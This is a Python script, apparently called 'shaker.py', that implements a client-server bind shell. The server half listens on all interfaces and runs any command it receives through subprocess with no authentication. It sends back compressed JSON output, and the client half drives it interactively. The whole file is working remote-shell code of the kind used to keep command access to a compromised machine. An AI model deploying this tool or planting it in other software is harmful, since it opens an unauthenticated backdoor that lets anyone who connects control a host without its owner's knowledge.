import socket
import sys
import json
import zlib
import platform
import subprocess

class BindShellServer:
    def __init__(self, port):
        self.host = '0.0.0.0'
        self.port = port
        self.init_cmd = 'pwd' if platform.system() in ['Linux', 'SunOS'] else 'cd'

    def start(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind((self.host, self.port))
                server_socket.listen(1)
                print(f"[{socket.gethostbyname(socket.gethostname())}:{self.port}] Waiting for connection...")

                conn, addr = server_socket.accept()
                with conn:
                    print(f"Connected with {addr[0]}")
                    welcome_msg = {
                        "msg": f"Connected with {platform.system()} at {socket.gethostbyname(socket.gethostname())}",
                        "location": self.run_cmd(self.init_cmd)[1]
                    }
                    conn.sendall(zlib.compress(json.dumps(welcome_msg).encode()))

                    while True:
                        try:
                            command = conn.recv(2048)
                            if not command:
                                break
                            command = command.decode().strip()
                            if command.lower() == 'exit':
                                break
                            output, location = self.run_cmd(command)
                            response = {"output": output, "location": location}
                            conn.sendall(zlib.compress(json.dumps(response).encode()))
                        except Exception as e:
                            print(f"Connection error: {e}")
                            break

        except KeyboardInterrupt:
            print("Server interrupted by user.")
        except Exception as e:
            print(f"Server error: {e}")

    def run_cmd(self, command):
        try:
            location = subprocess.getoutput(self.init_cmd)
            output = subprocess.getoutput(command)
            return output, location
        except Exception as e:
            return f"Command failed: {e}", ""

class BindShellClient:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                    client_socket.connect((self.ip, self.port))
                    data = json.loads(zlib.decompress(client_socket.recv(2048)).decode())
                    print(data.get("msg"))

                    while True:
                        try:
                            command = input(f"{data.get('location').strip()}> ")
                            if command.lower() == 'exit':
                                client_socket.sendall(command.encode())
                                print("Exiting client.")
                                return
                            client_socket.sendall(command.encode())
                            response = json.loads(zlib.decompress(client_socket.recv(2048)).decode())
                            print(response.get("output"))
                            data = response
                        except Exception as e:
                            print(f"Server disconnected: {e}")
                            return
            except (ConnectionRefusedError, socket.error):
                print("Connection failed. Server may be down.")
                retry = input("Try reconnect? [Y/n]: ").strip().lower()
                if retry == 'n':
                    break

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 shaker.py [client/server] [port] [ip (client only)]")
        sys.exit(1)

    role = sys.argv[1].lower()
    port = int(sys.argv[2])

    if role == 'server':
        server = BindShellServer(port)
        server.start()
    elif role == 'client':
        if len(sys.argv) != 4:
            print("Client mode requires IP address.")
            sys.exit(1)
        ip = sys.argv[3]
        client = BindShellClient(ip, port)
        client.start()
    else:
        print("Invalid role. Choose 'client' or 'server'.")

if __name__ == '__main__':
    main()

